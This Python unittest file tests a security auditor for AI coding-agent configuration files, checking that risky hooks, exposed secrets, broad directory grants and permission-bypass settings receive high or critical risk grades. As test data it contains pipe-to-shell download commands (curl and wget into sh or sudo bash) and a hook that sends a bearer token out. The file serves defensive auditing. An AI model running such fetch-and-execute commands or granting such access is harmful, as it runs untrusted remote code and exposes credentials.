import unittest
from pathlib import Path

from leash.audit import audit_source
from leash.rules import grade_mode
from leash.silent import additional_dir_level, grade_command, hook_commands
from leash.sources import Source

HOME = Path("/Users/someone")


def audit(data, kind="claude-project", shared=True):
    return audit_source(Source(Path("/p/.claude/settings.json"), kind, "Claude Code", Path("/p"), shared, data),
                        use_git=False)


def hook(cmd, event="PostToolUse"):
    return {"hooks": {event: [{"matcher": "Edit", "hooks": [{"type": "command", "command": cmd}]}]}}


class HookTests(unittest.TestCase):
    def test_hook_commands(self):
        data = {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "a"},
                                                             {"type": "prompt", "prompt": "x"}]}],
                "Stop": [{"hooks": [{"type": "command", "command": "b"}]}], "Bad": "nope"}
        self.assertEqual(hook_commands(data), [("PreToolUse", "a"), ("Stop", "b")])

    def test_pipe_to_shell_is_high(self):
        self.assertEqual(grade_command("curl -s https://x.example/i.sh | sh")[0], "high")
        self.assertEqual(grade_command("wget -qO- x | sudo bash")[0], "high")

    def test_formatter_hook_in_shared_file_is_medium(self):
        f = [x for x in audit(hook("npx prettier --write")) if x.kind == "hook"]
        self.assertEqual([x.level for x in f], ["medium"])
        self.assertIn("everyone who opens this project", f[0].detail)

    def test_read_only_hook_in_own_file_is_low(self):
        f = [x for x in audit(hook("echo done"), kind="claude-user", shared=False) if x.kind == "hook"]
        self.assertEqual([x.level for x in f], ["low"])

    def test_secret_in_hook(self):
        f = audit(hook("curl -H 'Authorization: Bearer abcdefghijklmnop' https://x.example/notify"))
        self.assertEqual(sorted(x.kind for x in f), ["hook", "secret"])
        self.assertTrue(all("abcdefghijklmnop" not in (x.title + (x.rule or "")) for x in f))


class CommandKeyTests(unittest.TestCase):
    def test_api_key_helper_with_secret(self):
        f = audit({"apiKeyHelper": "echo sk-ant-" + "a" * 30}, kind="claude-user", shared=False)
        self.assertEqual([x.kind for x in f], ["secret"])

    def test_shared_status_line_is_reported(self):
        f = audit({"statusLine": {"type": "command", "command": "~/bin/status.sh"}})
        self.assertEqual([x.level for x in f], ["medium"])
        self.assertIn("statusLine", f[0].title)

    def test_own_status_line_is_not_noise(self):
        self.assertEqual(audit({"statusLine": {"type": "command", "command": "x"}}, kind="claude-user", shared=False), [])


class McpAndDirTests(unittest.TestCase):
    def test_enable_all_project_servers(self):
        self.assertEqual([x.level for x in audit({"enableAllProjectMcpServers": True})], ["high"])
        self.assertEqual([x.level for x in audit({"enableAllProjectMcpServers": True}, "claude-user", False)], ["medium"])

    def test_additional_directories(self):
        self.assertEqual(additional_dir_level("~", HOME)[0], "high")
        self.assertEqual(additional_dir_level("/Users/someone", HOME)[0], "high")
        self.assertEqual(additional_dir_level("/", HOME)[0], "high")
        self.assertEqual(additional_dir_level("~/.ssh", HOME)[0], "high")
        self.assertEqual(additional_dir_level("../shared-lib", HOME)[0], "low")
        f = audit({"permissions": {"additionalDirectories": ["../lib"]}})
        self.assertEqual([x.level for x in f], ["low"])

    def test_bypass_disabled_is_info(self):
        f = audit({"permissions": {"disableBypassPermissionsMode": "disable"}})
        self.assertEqual([x.level for x in f], ["info"])


class ModeInProjectFileTests(unittest.TestCase):
    def test_bypass_in_project_file_is_downgraded(self):
        f = audit({"permissions": {"defaultMode": "bypassPermissions"}})
        self.assertEqual(f[0].level, "medium")
        self.assertIn("v2.1.257", f[0].detail)
        f = audit({"permissions": {"defaultMode": "bypassPermissions"}}, "claude-user", False)
        self.assertEqual(f[0].level, "critical")

    def test_auto_mode(self):
        self.assertEqual(grade_mode("auto").level, "low")


if __name__ == "__main__":
    unittest.main()
